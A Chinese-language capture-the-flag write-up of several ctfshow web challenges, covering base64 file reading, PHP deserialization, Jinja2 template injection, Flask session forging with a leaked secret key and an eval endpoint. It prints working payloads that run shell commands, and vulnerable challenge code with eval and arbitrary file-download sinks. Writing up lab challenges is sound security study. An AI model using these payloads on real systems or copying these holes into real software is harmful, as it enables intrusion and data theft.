### 热身
ctfshow{一个不能说的秘密}

## Web
### easy_signin
看到url中的base64，应该是文件包含，读index.php

```php
<?php
/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2023-03-27 10:30:30
# @Last Modified by:   h1xa
# @Last Modified time: 2023-03-28 12:15:33
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

$image=$_GET['img'];

$flag = "ctfshow{9ce9236e-2124-4bdc-a4ab-813c9948bf2a}";
if(isset($image)){
	$image = base64_decode($image);
	$data = base64_encode(file_get_contents($image));
	echo "<img src='data:image/png;base64,$data'/>";
}else{
	$image = base64_encode("face.png");
	header("location:/?img=".$image);
}


```


### 被遗忘的反序列化

index.php
```php
<?php  
  
# 当前目录中有一个txt文件哦  
error_reporting(0);  
show_source(__FILE__);  
include("check.php");  
  
class EeE{  
    public $text;  
    public $eeee;  
    public function __wakeup(){  
        if ($this->text == "aaaa"){  
            echo lcfirst($this->text);  
        }  
    }  
  
    public function __get($kk){  
        echo "$kk,eeeeeeeeeeeee";  
    }  
  
    public function __clone(){        
	    $a = new cycycycy;        
	    $a -> aaa();  
    }  
      
}  
  
class cycycycy{  
    public $a;  
    private $b;  
  
    public function aaa(){        
	    $get = $_GET['get'];        
	    $get = cipher($get);  
        if($get === "p8vfuv8g8v8py"){  
            eval($_POST["eval"]);  
        }  
    }  
  
  
    public function __invoke(){        $a_a = $this -> a;  
        echo "\$a_a\$";  
    }  
}  
  
class gBoBg{  
    public $name;  
    public $file;  
    public $coos;  
    private $eeee="-_-";  
    public function __toString(){  
        if(isset($this->name)){            
	        $a = new $this->coos($this->file);  
            echo $a;  
        }else if(!isset($this -> file)){  
            return $this->coos->name;  
        }else{            
	        $aa = $this->coos;            
	        $bb = $this->file;  
            return $aa();  
        }  
    }  
}     
  
class w_wuw_w{  
    public $aaa;  
    public $key;  
    public $file;  
    public function __wakeup(){  
        if(!preg_match("/php|63|\*|\?/i",$this -> key)){            
	        $this->key = file_get_contents($this -> file);  
        }else{  
            echo "不行哦";  
        }  
    }  
  
    public function __destruct(){  
        echo $this->aaa;  
    }  
  
    public function __invoke(){        
	    $this -> aaa = clone new EeE;  
    }  
}  
  
$_ip = $_SERVER["HTTP_AAAAAA"];  
unserialize($_ip);

```

### easy_ssti
F12
![](attachments/Pasted%20image%2020230401110342.png)

下载后没用上，直接payload
`http://b74e88b9-a74a-4588-8484-eecc11016779.challenge.ctf.show/hello/{{g.pop.__globals__.__builtins__['__import__']('os').popen('cat app.py').read()}}`

app.py
```python
from flask import Flask 
from flask import render_template_string,render_template,send_file 

app = Flask(__name__) 

@app.route('/') 
def hello(name=None): 
	return render_template('hello.html',name=name) 
	
@app.route('/hello/<name>') 
def hellodear(name): 
	if "ge" in name: 
		return render_template_string('hello %s' % name) 
	elif "f" not in name: 
		return render_template_string('hello %s' % name) 
	else: return 'Nonononon' 
	
@app.route('/app.zip') 
def downloadzip(): 
	path="app.zip" 
	return send_file(path) 
	
if __name__ == '__main__': 
	app.run(host="0.0.0.0", port=5000, debug=True)
```

这个是实际上的app.py和zip包中的有一些不同，会看到开了debug，加上前面用payload找不到flag感觉可能是算pin码，在访问时发现会显示没有这个路径，在templates那里测了一下感觉应该是/的问题
就不想着去编码绕过啥的了，直接用命令写shell脚本来执行命令

![](attachments/Pasted%20image%2020230402110424.png)

`http://9854eeed-d441-4439-8254-f47232adb554.challenge.ctf.show/hello/{{g.pop.__globals__.__builtins__['__import__']('os').popen('echo "IyEvYmluL2Jhc2gKY2F0IC9mbGFnID4gMS50eHQ=" | base64 -d >1.sh').read()}}`


### easy_flask
注册了应该账号进去看发现了一个存在代码的页面

![](attachments/Pasted%20image%2020230401114752.png)

这个sercert_key让我联想到了之前的一道题，是通过secret_key来伪造session的，这里应该是考虑信息泄露
`app.secret_key = 'S3cr3tK3y'`
用flask-unsign
[Paradoxis/Flask-Unsign: Command line tool to fetch, decode, brute-force and craft session cookies of a Flask application by guessing secret keys. (github.com)](https://github.com/Paradoxis/Flask-Unsign)

`flask-unsign --decode --cookie 'eyJsb2dnZWRpbiI6dHJ1ZSwicm9sZSI6InVzZXIiLCJ1c2VybmFtZSI6Ind1d3V3dW1vbnN0ZXIifQ.ZCeo3Q.5_brJDEUf7Lg5mh4YutWd4hab1E' --secret 'S3cr3tK3y'`

![](attachments/Pasted%20image%2020230401120339.png)

`flask-unsign --sign --cookie "{'loggedin': True, 'role': 'admin', 'username': 'wuwumonster'}" --secret 'S3cr3tK3y'`
假flag捏

![](attachments/Pasted%20image%2020230401121336.png)

想到了用这个下载fakeflag的url下载源码

```python
# app.py
from flask import Flask, render_template, request, redirect, url_for, session, send_file, Response


app = Flask(__name__)


app.secret_key = 'S3cr3tK3y'

users = {
    'admin': {'password': 'LKHSADSFHLA;KHLK;FSDHLK;ASFD', 'role': 'admin'}
}



@app.route('/')
def index():
    # Check if user is loggedin
    if 'loggedin' in session:
        return redirect(url_for('profile'))
    return redirect(url_for('login'))

@app.route('/login/', methods=['GET', 'POST'])
def login():
    msg = ''
    if request.method == 'POST' and 'username' in request.form and 'password' in request.form:
        username = request.form['username']
        password = request.form['password']
        if username in users and password == users[username]['password']:
            session['loggedin'] = True
            session['username'] = username
            session['role'] = users[username]['role']
            return redirect(url_for('profile'))
        else:
            msg = 'Incorrect username/password!'
    return render_template('login2.html', msg=msg)


@app.route('/register/', methods=['GET', 'POST'])
def register():
    msg = '' 
    if request.method == 'POST' and 'username' in request.form and 'password' in request.form:
        username = request.form['username']
        password = request.form['password']
        if username in users:
            msg = 'Account already exists!'
        else:
            users[username] = {'password': password, 'role': 'user'}
            msg = 'You have successfully registered!'
    return render_template('register2.html', msg=msg)



@app.route('/profile/')
def profile():
    if 'loggedin' in session:
        return render_template('profile2.html', username=session['username'], role=session['role'])
    return redirect(url_for('login'))


@app.route('/show/')
def show():
    if 'loggedin' in session:
        return render_template('show2.html')

@app.route('/download/')
def download():
    if 'loggedin' in session:
        filename = request.args.get('filename')
        if 'filename' in request.args:              
            return send_file(filename, as_attachment=True)
  
    return redirect(url_for('login'))


@app.route('/hello/')
def hello_world():
    try:
        s = request.args.get('eval')
        return f"hello,{eval(s)}"
    except Exception as e:
        print(e)
        pass
        
    return "hello"
    


@app.route('/logout/')
def logout():
   session.pop('loggedin', None)
   session.pop('id', None)
   session.pop('username', None)
   session.pop('role', None)
   return redirect(url_for('login'))


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080)

```

有一个hello的路由可以命令执行
payload
`/hello?eval=__import__('os').popen('cat /flag_is_h3re').read()`

![](attachments/Pasted%20image%2020230401132040.png)